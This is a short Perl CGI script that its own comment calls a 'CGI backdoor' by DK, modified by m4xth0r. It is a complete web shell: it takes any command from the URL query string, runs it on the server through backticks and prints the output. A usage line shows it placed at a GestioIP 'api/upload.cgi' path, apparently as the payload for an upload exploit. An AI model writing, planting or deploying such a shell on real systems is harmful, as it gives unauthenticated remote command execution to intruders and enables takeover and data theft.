#!/usr/bin/perl -w

use strict;

print "Cache-Control: no-cache\n";
print "Content-type: text/html\n\n";

my $req = $ENV{QUERY_STRING};
        chomp ($req);
        $req =~ s/%20/ /g; 
        $req =~ s/%3b/;/g;
	$req =~ s/%7c/|/gi;
	$req =~ s/%27/'/g;    # Converts %27 into '
	$req =~ s/%22/"/g;
	$req =~ s/%5D/]/g;
	$req =~ s/%5B/[/g;

print "<html><body>";

print '<!-- CGI backdoor by DK (http://michaeldaw.org). Modified by m4xth0r (http://maxibelino.github.io) -->';

        if (!$req) {
                print "Usage: http://domain/gestioip/api/upload.cgi?whoami";
        }
        else {
                print "Executing: $req";
        }

        print "<pre>";
        my @cmd = `$req`;
        print "</pre>";

        foreach my $line (@cmd) {
                print $line . "<br/>";
        }

print "</body></html>";
